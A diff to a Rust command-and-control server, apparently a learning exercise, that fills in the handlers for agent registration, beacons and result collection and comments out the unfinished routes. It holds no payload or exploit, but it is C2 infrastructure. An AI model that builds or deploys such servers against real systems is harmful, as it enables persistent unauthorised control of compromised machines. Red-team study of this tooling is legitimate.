@@ -12,7 +12,7 @@ use std::{
     sync::{Arc, Mutex},
 };
 
-use crate::{SharedState, models::*};
+use crate::models::*;
 
 /// Start the C2 HTTP server
 pub async fn start_server() {
@@ -24,11 +24,10 @@ pub async fn start_server() {
         .route("/api/register", post(handle_register))
         .route("/api/beacon", post(handle_beacon))
         .route("/api/result", post(handle_result))
-        .route(
-            "/api/command",
-            post(queue_command(state, agent_id, command_type, payload)),
-        )
-        // Future: Add more routes here
+        // TODO: Add more routes as you implement them
+        // .route("/api/command", post(handle_queue_command))
+        // .route("/api/agents", get(handle_list_agents))
+        // .route("/api/result/:id", get(handle_get_result))
         .with_state(state);
 
     // Bind to address
@@ -36,7 +35,6 @@ pub async fn start_server() {
     println!("🚀 C2 Server listening on http://{}", addr);
     println!("📡 Waiting for agents to connect...\n");
 
-    // Start the server
     let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
     axum::serve(listener, app).await.unwrap();
 }
@@ -47,10 +45,8 @@ async fn handle_register(
 ) -> Json<RegisterResponse> {
     println!("📥 Registration request from agent: {}", req.agent_id);
 
-    // Lock the state to modify it
     let mut state = state.lock().unwrap();
 
-    // Create Agent struct from request
     let agent = Agent {
         id: req.agent_id.clone(),
         hostname: req.hostname,
@@ -92,27 +88,26 @@ async fn handle_beacon(
 ) -> Json<BeaconResponse> {
     println!("💓 Beacon from agent: {}", req.agent_id);
 
-    // TODO: Lock the state
     let mut state = state.lock().unwrap();
 
-    // TODO: Update the agent's last_seen timestamp
-    // HINT: if let Some(agent) = state.agents.get_mut(&req.agent_id) { ... }
-
+    // Update the agent's last_seen timestamp
     if let Some(agent) = state.agents.get_mut(&req.agent_id) {
         agent.last_seen = Utc::now();
     } else {
         println!("⚠️ Warning: Beacon from unknown agent: {}", req.agent_id);
     }
 
-    // TODO: Get pending commands from the queue
+    // Get pending commands from the queue
     let commands: Vec<Command> = if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
-        queue.drain(..).collect()
+        queue.drain(..).collect() // Remove all commands and return them
     } else {
         Vec::new()
     };
 
-    // TODO: Return the commands
-    // For now, returning empty list - YOU IMPLEMENT THE ABOVE
+    if !commands.is_empty() {
+        println!("   📤 Sending {} command(s) to agent", commands.len());
+    }
+
     Json(BeaconResponse { commands })
 }
 
@@ -120,11 +115,8 @@ async fn handle_result(
     State(state): State<SharedState>,
     Json(req): Json<ResultRequest>,
 ) -> Json<ResultResponse> {
-    // TODO: IMPLEMENT THIS FUNCTION
-
     println!("📨 Result received for command: {}", req.command_id);
 
-    // Lock the state
     let mut state = state.lock().unwrap();
 
     let command_result = CommandResult {
@@ -177,12 +169,16 @@ pub fn queue_command(
     }
 }
 
-/// Get all registered agents (will be used by CLI)
+// pub fn handle_list_agent(){
+
+// }
+
+/// Get all registered agents
 pub fn get_agents(state: &AppState) -> Vec<Agent> {
     state.agents.values().cloned().collect()
 }
 
-/// Get result for a command (will be used by CLI to check if result ready)
+/// Get result for a command
 pub fn get_result(state: &AppState, command_id: &str) -> Option<CommandResult> {
     state.results.get(command_id).cloned()
 }
